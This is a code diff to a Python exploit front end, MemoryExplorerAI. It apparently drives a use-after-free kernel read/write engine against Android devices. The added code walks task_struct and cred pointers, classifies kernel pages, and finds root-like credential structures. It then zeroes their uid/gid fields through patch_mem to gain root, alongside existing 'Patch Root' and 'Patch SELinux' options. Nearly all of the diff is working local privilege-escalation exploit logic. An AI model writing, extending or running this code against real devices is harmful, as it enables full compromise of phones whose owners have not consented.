@@ -255,8 +255,10 @@ class MemoryExplorerAI:
     def classify_page(self, page_data, va, sig=0, off_in_page=-1):
         """Classify a found memory page. sig comes from the C engine
         (1=task_struct with KETO0422, 2=system app, 3=kernel ELF, 4=init_cred,
-         6=cred pointer). 100% when sig>0. SELinux is no longer found by
-        random scan — it must be probed via _probe_selinux (known offset)."""
+         6=cred pointer, 7=Linux version banner, 8=kernel text/data marker,
+         9=root-cred heap pattern). 100% when sig>0. SELinux is no longer
+        found by random scan — it must be probed via _probe_selinux
+        (known offset)."""
         # 1. task_struct with KETO0422 comm (from spray) — this is 100% a task_struct
         if sig == 1:
             cred_va = va + (self.cred_offset - off_in_page)
@@ -288,6 +290,25 @@ class MemoryExplorerAI:
             return {"type": "Privilege Struct",
                     "description": f"cred pointer @ 0x{off_in_page:x} (100% task_struct.cred)",
                     "va": hex(va), "confidence": 100, "data": page_data}
+        # 7. Linux version banner — 100% it's kernel text/.rodata
+        if sig == 7:
+            tail = page_data[off_in_page:off_in_page + 64].split(b"\x00")[0]
+            tail = tail.decode(errors="ignore")
+            return {"type": "Kernel Code",
+                    "description": f"Linux banner: {tail[:50]}",
+                    "va": hex(va), "confidence": 100, "data": page_data}
+        # 8. Kernel text/data marker — 95% it's a kernel symbol
+        if sig == 8:
+            tail = page_data[off_in_page:off_in_page + 32].split(b"\x00")[0]
+            tail = tail.decode(errors="ignore")
+            return {"type": "Kernel Code",
+                    "description": f"Kernel marker: '{tail}' @ 0x{off_in_page:x}",
+                    "va": hex(va), "confidence": 95, "data": page_data}
+        # 9. Root-cred heap pattern — 90% it's init_cred / a cred with uid=0
+        if sig == 9:
+            return {"type": "Privilege Struct",
+                    "description": "Root cred (usage=1, uid/gid=0, kptr in field)",
+                    "va": hex(va), "confidence": 90, "data": page_data}
 
         # Fallback heuristic classification (no sig from engine)
         # NOTE: no SELinux here — SELinux only via _probe_selinux (known offset)
@@ -501,7 +522,7 @@ class MemoryExplorerAI:
             )
             out.append(
                 f" {C.BLU}[v<N>]{C.RST} Re-verify    "
-                f" {C.BLU}[reset_kb]{C.RST} Clear KB   "
+                f" {C.BLU}[walk]{C.RST} Cred chain   "
                 f" {C.BLU}[help]{C.RST} Help"
             )
             out.append(f"{C.GRY}{'─'*92}{C.RST}")
@@ -652,6 +673,96 @@ class MemoryExplorerAI:
         if not self._engine_write(f"read {hex(va)}\n".encode()):
             return None
         return self._read_data_packet()
+
+    def read_pages(self, va, n):
+        """Read N consecutive 4KB pages starting at va, return a single
+        contiguous buffer of size n*PAGE_SIZE. Use this when the offset
+        you're hunting for may straddle a page boundary."""
+        if n < 1:
+            n = 1
+        if n > 8:
+            n = 8
+        if not self._engine_write(f"readN {hex(va)} {n}\n".encode()):
+            return None
+        data = self._read_data_packet()
+        if data and len(data) != n * 4096:
+            return None
+        return data
+
+    def read_window(self, va, off, size):
+        """Read a small (≤256 byte) window at va+off. Faster than a full
+        page read when you only care about a few bytes."""
+        if size <= 0 or size > 256:
+            return None
+        if off < 0 or off + size > 4096:
+            return None
+        if not self._engine_write(f"window {hex(va)} {off} {size}\n".encode()):
+            return None
+        return self._read_data_packet()
+
+    def follow_pointer(self, va):
+        """Read 8 bytes at va (treated as a kernel pointer), then read a
+        full page at the dereferenced address. Returns (target_va, page)
+        or (None, None) on failure. Use to walk:
+        task_struct.cred -> struct cred -> user_ns
+        cred_jar -> ... etc."""
+        if not self._engine_write(f"follow {hex(va)}\n".encode()):
+            return (None, None)
+        # The engine prints "FOLLOW:<target>\nDATA:<target>:4096\n<data>\nDATA_END"
+        line = self._readline_timeout(timeout=2.0)
+        if not line or not line.startswith("FOLLOW:"):
+            return (None, None)
+        try:
+            target = int(line.split(":", 1)[1], 16)
+        except Exception:
+            return (None, None)
+        page = self._read_data_packet()
+        return (target, page)
+
+    def walk_cred_chain(self, task_va, off_in_page=0x770, max_hops=4):
+        """Follow a cred pointer at task_va+off_in_page and walk the
+        chain: cred -> real_cred -> ... Each hop is a pointer read +
+        page read at the target. Returns a list of (va, page, description)
+        tuples. The first item where uid=gid=0 is the one we want."""
+        chain = []
+        cur_va = task_va + off_in_page
+        for hop in range(max_hops):
+            tgt, page = self.follow_pointer(cur_va)
+            if not page or not tgt:
+                break
+            desc = "Unknown"
+            try:
+                usage = int.from_bytes(page[0:4], "little")
+                uid   = int.from_bytes(page[4:8], "little")
+                gid   = int.from_bytes(page[8:12], "little")
+                if usage > 0 and usage < 100 and uid == 0 and gid == 0:
+                    desc = f"ROOT CRED (usage={usage} uid=0 gid=0)"
+                else:
+                    desc = f"cred (usage={usage} uid={uid} gid={gid})"
+            except Exception:
+                pass
+            chain.append((tgt, page, desc))
+            # If this looked like init_cred, stop walking
+            if "ROOT" in desc:
+                break
+            # Try the next link: real_cred at offset +8 of cred
+            cur_va = tgt + 8
+        return chain
+
+    def read_with_neighbors(self, va):
+        """Smart multi-page read: returns the page at va AND its 2 neighbors
+        (-1, 0, +1) as 3 concatenated pages. Useful when scanning, so the
+        caller can check for cross-page patterns like:
+          - kernel pointer at the very end of a page
+          - 8-byte string at a page boundary
+          - struct members split between two pages."""
+        base = va & ~0xFFF
+        # Read 3 pages in one go
+        triple = self.read_pages(base - 0x1000, 3)
+        if not triple:
+            # Fallback: just one page
+            return self.read_page(va) or b""
+        return triple
 
     def patch_mem(self, va, val):
         if not self._engine_write(f"patch {hex(va)} {hex(val)}\n".encode()):
@@ -1071,6 +1182,50 @@ class MemoryExplorerAI:
                         desc=f"{f['name']}={f['val']} (nz={f['nonzero']})",
                         confidence=80,
                     )
+
+                # 4. Walk cred chain from a known task_struct (if we found one)
+                self.live["last_msg"] = "AUTO: walking cred chain from known task_structs…"
+                walked = 0
+                with self.bg_lock:
+                    ts_items = [it for it in self.found_items
+                                if it['type'] in ("Privilege Struct", "task_struct")
+                                and 'task_struct' in it.get('description', '').lower()
+                                and 'cred @' in it.get('description', '')]
+                for it in ts_items[:3]:
+                    try:
+                        ts_va = int(it['va'], 16)
+                    except Exception:
+                        continue
+                    # cred pointer is at offset 0x770 (or alt: 0x768, 0x778, 0x780)
+                    for off in (0x770, 0x768, 0x778, 0x780):
+                        chain = self.walk_cred_chain(ts_va, off_in_page=off, max_hops=3)
+                        if not chain:
+                            continue
+                        for step_idx, (tgt, page, desc) in enumerate(chain):
+                            walked += 1
+                            self._add_found(
+                                va=hex(tgt),
+                                type="Privilege Struct",
+                                desc=f"{desc} (hop {step_idx} from {hex(ts_va)}+0x{off:x})",
+                                confidence=95 if "ROOT" in desc else 70,
+                                data=page,
+                            )
+                            if "ROOT" in desc:
+                                # Found init_cred-like via chain — patch uid/gid
+                                self.cred_va = tgt
+                                for f_off in (4, 8, 12, 16, 20, 24):
+                                    self.patch_mem(tgt + f_off, 0)
+                                self._add_found(
+                                    va=hex(tgt),
+                                    type="Privilege Struct (ROOTED)",
+                                    desc="init_cred-like (from cred chain walk, patched)",
+                                    confidence=100,
+                                )
+                                break
+                        if self.cred_va:
+                            break
+                    if self.cred_va:
+                        break
                 self.live["last_msg"] = (
                     f"AUTO DONE: kbase=0x{kbase:x} selinux={sel_str} "
                     f"cred={ic_str} extras={len(extra)}")
@@ -1168,42 +1323,47 @@ class MemoryExplorerAI:
                             pass
                         continue
                     if "MATCH:" in line:
-                        try:
-                            parts = line.split(":")
-                            va = int(parts[1], 16)
-                            sig = int(parts[2])
-                            off_in_page = int(parts[3]) if len(parts) > 3 else -1
-                        except Exception:
-                            continue
-                        self.live["scan_offset"] = va - self.uaf_start
-                        data = self._read_data_packet()
-                        if not data:
-                            continue
-                        if any(int(it['va'], 16) == va for it in self.found_items):
-                            continue
-                        # Strong matches go in immediately
-                        if sig in (1, 3, 4, 6) or self._is_real_task_struct(data):
-                            with self.bg_lock:
-                                self.found_items.append(
-                                    self.classify_page(data, va, sig, off_in_page))
-                            self.log_event("scan_match", {"va": va,
-                                                           "type": self.found_items[-1]['type'],
-                                                           "sig": sig})
-                        else:
-                            # Keep weaker matches as "Unknown Object"
-                            interesting, reason, conf = self._is_page_interesting(data)
-                            if interesting:
+                            try:
+                                parts = line.split(":")
+                                va = int(parts[1], 16)
+                                sig = int(parts[2])
+                                off_in_page = int(parts[3]) if len(parts) > 3 else -1
+                            except Exception:
+                                continue
+                            self.live["scan_offset"] = va - self.uaf_start
+                            data = self._read_data_packet()
+                            if not data:
+                                continue
+                            if any(int(it['va'], 16) == va for it in self.found_items):
+                                continue
+                            # Smart multi-page read for strong sigs
+                            cross = data
+                            if sig in (1, 2, 3, 4, 6, 7, 8, 9) and off_in_page >= 0:
+                                triple = self.read_with_neighbors(va)
+                                if triple and len(triple) == 12288:
+                                    cross = triple
+                            if sig in (1, 2, 3, 4, 6, 7, 8, 9) or self._is_real_task_struct(cross):
                                 with self.bg_lock:
-                                    self.found_items.append({
-                                        "type": "Unknown Object",
-                                        "description": f"Auto-found ({reason})",
-                                        "va": hex(va),
-                                        "confidence": conf,
-                                        "data": data,
-                                        "ts": datetime.datetime.now().isoformat(),
-                                    })
-                                self.log_event("scan_auto", {"va": va, "reason": reason,
-                                                              "conf": conf})
+                                    self.found_items.append(
+                                        self.classify_page(cross, va, sig, off_in_page))
+                                self.log_event("scan_match", {"va": va,
+                                                               "type": self.found_items[-1]['type'],
+                                                               "sig": sig})
+                            else:
+                                # Keep weaker matches as "Unknown Object"
+                                interesting, reason, conf = self._is_page_interesting(data)
+                                if interesting:
+                                    with self.bg_lock:
+                                        self.found_items.append({
+                                            "type": "Unknown Object",
+                                            "description": f"Auto-found ({reason})",
+                                            "va": hex(va),
+                                            "confidence": conf,
+                                            "data": data,
+                                            "ts": datetime.datetime.now().isoformat(),
+                                        })
+                                    self.log_event("scan_auto", {"va": va, "reason": reason,
+                                                                  "conf": conf})
 
                 self.live["scan_offset"] = self.scan_size
                 self.live["last_msg"] = f"Scan complete. Found {len(self.found_items)} items."
@@ -1344,9 +1504,18 @@ class MemoryExplorerAI:
                         already = any(int(it['va'], 16) == va for it in self.found_items)
                         if already:
                             continue
-                        # Strong matches (sig from engine or task_struct) go in
+                        # 3a) SMART READ: also fetch +/- 1 page so we catch
+                        # patterns that straddle the page boundary (comm at
+                        # the very start/end, pointer at 0xFF8, string
+                        # across pages, etc.). Only do this for sig>=1.
+                        cross_data = data
+                        if sig >= 1 and off_in_page >= 0 and off_in_page < 4096:
+                            triple = self.read_with_neighbors(va)
+                            if triple and len(triple) == 12288:
+                                cross_data = triple
+                        # 3b) Strong matches (sig from engine or task_struct) go in
                         # with high confidence immediately
-                        if sig in (1, 3, 4, 6) or self._is_real_task_struct(data):
+                        if sig in (1, 2, 3, 4, 6, 7, 8, 9) or self._is_real_task_struct(cross_data):
                             with self.bg_lock:
                                 self.found_items.append(
                                     self.classify_page(data, va, sig, off_in_page))
@@ -1383,6 +1552,32 @@ class MemoryExplorerAI:
                                             self.cred_va = ic
                                             self.live["last_msg"] = (
                                                 f"LEARN: init_cred @ 0x{ic:x}")
+                            # If we found a cred pointer (sig 6) and we don't
+                            # have a root cred yet, follow the chain.
+                            if sig == 6 and off_in_page >= 0 and not self.cred_va:
+                                self.live["last_msg"] = (
+                                    f"LEARN: following cred chain from 0x{va:x}+0x{off_in_page:x}…")
+                                chain = self.walk_cred_chain(
+                                    va, off_in_page=off_in_page, max_hops=3)
+                                for step_idx, (tgt, page, desc) in enumerate(chain):
+                                    with self.bg_lock:
+                                        self.found_items.append({
+                                            "type": "Privilege Struct",
+                                            "description": f"{desc} (chain hop {step_idx})",
+                                            "va": hex(tgt),
+                                            "confidence": 95 if "ROOT" in desc else 70,
+                                            "data": page,
+                                        })
+                                    self.log_event("cred_chain", {
+                                        "from": hex(va), "to": hex(tgt),
+                                        "hop": step_idx, "desc": desc})
+                                    if "ROOT" in desc:
+                                        self.cred_va = tgt
+                                        self.live["last_msg"] = (
+                                            f"LEARN: ROOT cred @ 0x{tgt:x}, patching…")
+                                        for f_off in (4, 8, 12, 16, 20, 24):
+                                            self.patch_mem(tgt + f_off, 0)
+                                        break
                         else:
                             # Keep weaker matches as "Unknown Object" so user
                             # can inspect them manually
@@ -1448,18 +1643,26 @@ class MemoryExplorerAI:
 
     def _is_real_task_struct(self, data):
         """Heuristic: is this a real task_struct page?
-        Strong indicators: KETO0422, com.android., comm string at 0x718."""
+        Strong indicators: KETO0422, com.android., comm string at 0x718.
+        data can be a single 4KB page OR a 3-page triple (12288 bytes)
+        from read_with_neighbors — in which case offsets 0x718..0x728
+        cover 3 possible page-alignment positions."""
         if not data or len(data) < 0x800:
             return False
         if data.find(b"KETO0422") >= 0:
             return True
         if data.find(b"com.android.") >= 0:
             return True
-        # comm at 0x718 — printable ASCII string
-        comm = data[self.comm_offset:self.comm_offset + 16]
-        s = comm.split(b"\x00")[0]
-        if 1 < len(s) < 16 and all(0x20 <= c <= 0x7e for c in s):
-            return True
+        # comm at 0x718 — printable ASCII string. If we got a 3-page
+        # triple, also try the offset shifted by ±0x1000 in case the
+        # page boundary cut our struct in half.
+        for shift in (0, 0x1000, -0x1000):
+            comm_off = self.comm_offset + shift
+            if 0 <= comm_off and comm_off + 16 <= len(data):
+                comm = data[comm_off:comm_off + 16]
+                s = comm.split(b"\x00")[0]
+                if 1 < len(s) < 16 and all(0x20 <= c <= 0x7e for c in s):
+                    return True
         return False
 
     def _is_page_interesting(self, data):
@@ -1470,13 +1673,13 @@ class MemoryExplorerAI:
         # Count non-zero
         nonzero = sum(1 for b in data if b != 0)
         if nonzero < 16:
-            return (False, f"mostly zero ({nonzero}/4096)", 0)
-        # Look for kernel pointers
+            return (False, f"mostly zero ({nonzero}/{len(data)})", 0)
+        # Look for kernel pointers (scanning 8-byte aligned slots)
         for i in range(0, len(data) - 8, 8):
             v = int.from_bytes(data[i:i+8], "little")
             if 0xffffff8000000000 <= v <= 0xffffffcfffffffff and v != 0:
                 return (True, f"kernel pointer at 0x{i:x}", 70)
-        # Look for strings
+        # Look for strings (run-length of printable ASCII)
         ascii_runs = 0
         run = 0
         for b in data:
@@ -1644,7 +1847,9 @@ class MemoryExplorerAI:
     # ============== ITEM VERIFICATION ==============
     def verify_item(self, item_idx):
         """Re-read the VA of a found item and re-classify the page.
-        Useful when the user wants to confirm a found offset is still valid."""
+        Uses read_with_neighbors (3-page triple) so we can catch
+        cross-page patterns (kernel pointer at page end, comm at page
+        boundary, etc.)."""
         if item_idx < 0 or item_idx >= len(self.found_items):
             self.live["last_msg"] = f"Invalid index: {item_idx}"
             return
@@ -1654,23 +1859,40 @@ class MemoryExplorerAI:
         except Exception:
             self.live["last_msg"] = f"Invalid VA: {item['va']}"
             return
-        self.live["last_msg"] = f"Verifying {item['va']}…"
-        data = self.read_page(va)
+        self.live["last_msg"] = f"Re-verifying {item['va']} (with neighbors)…"
+        # Use multi-page read (3 pages: -1, 0, +1) so we catch cross-page
+        # patterns the single-page read may have missed.
+        data = self.read_with_neighbors(va)
         if not data:
-            self.live["last_msg"] = f"Read failed: {item['va']} (UAF dead?)"
-            return
-        item["data"] = data
-        # Re-classify using permissive filter so even weak pages get a
-        # meaningful description
+            # Fallback: just one page
+            data = self.read_page(va)
+            if not data:
+                self.live["last_msg"] = f"Read failed: {item['va']} (UAF dead?)"
+                return
+            scope = "single page"
+        else:
+            scope = "3-page window"
+        # If the result is a 3-page window, we store it as 3 separate
+        # pages of data in the item for inspection.
+        if len(data) == 12288:
+            item["data"] = data[0x1000:0x2000]      # primary page
+            item["data_prev"] = data[0:0x1000]      # previous page
+            item["data_next"] = data[0x2000:0x3000] # next page
+        else:
+            item["data"] = data
+            item.pop("data_prev", None)
+            item.pop("data_next", None)
+        # Re-classify using permissive filter
         interesting, reason, conf = self._is_page_interesting(data)
         if interesting:
-            item["description"] = f"Re-verified: {reason}"
+            item["description"] = f"Re-verified ({scope}): {reason}"
             item["confidence"] = conf
-            self.live["last_msg"] = (f"[{item_idx:02d}] {item['va']} re-verified: "
+            self.live["last_msg"] = (f"[{item_idx:02d}] {item['va']} re-verified ({scope}): "
                                      f"{reason} (conf={conf}%)")
         else:
-            self.live["last_msg"] = (f"[{item_idx:02d}] {item['va']} re-verified: "
-                                     f"EMPTY/ZERO ({sum(1 for b in data if b != 0)} non-zero bytes)")
+            nonzero = sum(1 for b in data if b != 0)
+            self.live["last_msg"] = (f"[{item_idx:02d}] {item['va']} re-verified ({scope}): "
+                                     f"EMPTY/ZERO ({nonzero} non-zero bytes)")
 
     # ============== DETAIL VIEW ==============
     def show_detail(self, item_idx):
@@ -1678,27 +1900,54 @@ class MemoryExplorerAI:
             self.live["last_msg"] = f"Invalid index: {item_idx} (have {len(self.found_items)} items)"
             return
         item = self.found_items[item_idx]
-        # Fetch the data if we don't have it (auto-found items don't carry data)
+        # Fetch the data if we don't have it (auto-found items don't carry data).
+        # We use read_with_neighbors so we can show prev/next pages and catch
+        # cross-page patterns (kernel pointer at page end, comm at boundary, …).
         data = item.get("data")
+        data_prev = item.get("data_prev")
+        data_next = item.get("data_next")
         if data is None:
             try:
                 va = int(item["va"], 16)
             except Exception:
                 self.live["last_msg"] = f"Invalid VA: {item['va']}"
                 return
-            data = self.read_page(va) or b""
+            triple = self.read_with_neighbors(va) or b""
+            if len(triple) == 12288:
+                data_prev, data, data_next = triple[0:0x1000], triple[0x1000:0x2000], triple[0x2000:0x3000]
+                item["data_prev"] = data_prev
+                item["data_next"] = data_next
+            elif triple:
+                data = triple
+            else:
+                data = self.read_page(va) or b""
             item["data"] = data
         # Confidence is stored as 0-100 integer now
         conf = item.get("confidence", 0)
         conf_disp = f"{conf:.1f}%" if isinstance(conf, float) else f"{conf}%"
 
         sys.stdout.write(C.CLR)
+        try:
+            va_int = int(item["va"], 16)
+            va_prev = f"0x{va_int - 0x1000:x}" if data_prev else "—"
+            va_next = f"0x{va_int + 0x1000:x}" if data_next else "—"
+        except Exception:
+            va_prev, va_next = "—", "—"
         sys.stdout.write(f"{C.BOLD}{C.CYN}=== FILE VIEW: [{item_idx:02d}] {item['va']} ==={C.RST}\n")
         sys.stdout.write(f"{C.GRY}Type:{C.RST} {item['type']:<20} "
                          f"{C.GRY}Confidence:{C.RST} {C.GRN}{conf_disp}{C.RST}\n")
         sys.stdout.write(f"{C.GRY}AI Logic:{C.RST} {self.translate_logic(item)}\n")
         sys.stdout.write(f"{C.GRY}{'─'*75}{C.RST}\n")
+        # Show prev page (if any) — useful for cross-page patterns
+        if data_prev:
+            sys.stdout.write(f" {C.DIM}── PREV PAGE @ {va_prev} ──{C.RST}\n")
+            for i in range(0, min(len(data_prev), 256), 16):
+                chunk = data_prev[i:i+16]
+                hex_row = " ".join(f"{b:02X}" for b in chunk)
+                printable = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
+                sys.stdout.write(f" {i:04X} | {hex_row:<48} | {printable}\n")
         if data:
+            sys.stdout.write(f" {C.DIM}── THIS PAGE @ {item['va']} ──{C.RST}\n")
             for i in range(0, min(len(data), 256), 16):
                 chunk = data[i:i+16]
                 hex_row = " ".join(f"{b:02X}" for b in chunk)
@@ -1706,10 +1955,18 @@ class MemoryExplorerAI:
                 sys.stdout.write(f" {i:04X} | {hex_row:<48} | {printable}\n")
         else:
             sys.stdout.write(f" {C.GRY}(no data — read failed){C.RST}\n")
+        if data_next:
+            sys.stdout.write(f" {C.DIM}── NEXT PAGE @ {va_next} ──{C.RST}\n")
+            for i in range(0, min(len(data_next), 256), 16):
+                chunk = data_next[i:i+16]
+                hex_row = " ".join(f"{b:02X}" for b in chunk)
+                printable = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
+                sys.stdout.write(f" {i:04X} | {hex_row:<48} | {printable}\n")
         sys.stdout.write(f"{C.GRY}{'─'*75}{C.RST}\n")
         sys.stdout.write(f" [{C.GRN}K{C.RST}] Patch Root  "
                          f"[{C.GRN}S{C.RST}] Patch SELinux  "
                          f"[{C.GRN}D{C.RST}] Delete from list  "
+                         f"[{C.GRN}V{C.RST}] Re-verify (3pg)  "
                          f"[{C.GRN}Enter{C.RST}] Back\n")
         sys.stdout.flush()
         try:
@@ -1743,6 +2000,11 @@ class MemoryExplorerAI:
                 if 0 <= item_idx < len(self.found_items):
                     self.found_items.pop(item_idx)
             self.live["last_msg"] = f"Deleted item [{item_idx:02d}]"
+        elif choice == "v":
+            # Re-verify using 3-page read (with neighbors)
+            self.verify_item(item_idx)
+            # Re-enter the detail view so the user sees the new data
+            self.show_detail(item_idx)
 
     # ============== MAIN LOOP ==============
     def run(self):
@@ -1971,6 +2233,41 @@ class MemoryExplorerAI:
                 }
                 self.save_kb()
                 self.live["last_msg"] = "Knowledge base reset."
+            elif cmd in ("walk", "follow", "wchain") or cmd.startswith("walk ") or cmd.startswith("follow "):
+                # Manual cred-chain walk from item #idx
+                parts = cmd.split()
+                if len(parts) >= 2 and parts[1].isdigit():
+                    idx = int(parts[1])
+                    if 0 <= idx < len(self.found_items):
+                        it = self.found_items[idx]
+                        try:
+                            base_va = int(it['va'], 16)
+                        except Exception:
+                            self.live["last_msg"] = f"Invalid VA: {it['va']}"
+                            self.live["last_msg"] = "Walk usage: walk <id> [off]"
+                            continue
+                        off = 0x770
+                        if len(parts) >= 3:
+                            try:
+                                off = int(parts[2], 0)
+                            except Exception:
+                                pass
+                        self.live["last_msg"] = f"Manually walking chain from {it['va']}+0x{off:x}…"
+                        chain = self.walk_cred_chain(base_va, off_in_page=off, max_hops=4)
+                        for step_idx, (tgt, page, desc) in enumerate(chain):
+                            self._add_found(
+                                va=hex(tgt),
+                                type="Privilege Struct",
+                                desc=f"{desc} (manual hop {step_idx})",
+                                confidence=95 if "ROOT" in desc else 70,
+                                data=page,
+                            )
+                        self.live["last_msg"] = f"Walked {len(chain)} hops: " + " → ".join(
+                            f"{hex(t[0])}" for t in chain)
+                    else:
+                        self.live["last_msg"] = f"Invalid idx: {parts[1]}"
+                else:
+                    self.live["last_msg"] = "Usage: walk <id> [off_in_page=0x770]"
             elif cmd in ("help", "?", "h"):
                 # Show full help
                 sys.stdout.write(C.CLR)
@@ -1987,6 +2284,7 @@ class MemoryExplorerAI:
                     ("Q / quit",           "Exit explorer"),
                     ("<id>",               "Open detail view of found item #id"),
                     ("v<id>",              "Re-verify found item #id (re-read VA)"),
+                    ("walk <id> [off]",    "Walk cred chain from item #id @ offset (default 0x770)"),
                     ("list / ls / items",  "Paginated dump of ALL found items"),
                     ("kb / kbase",         "Show kernel base / SELinux / init_cred status"),
                     ("log / logs",         "Show recent spray log (JSONL)"),
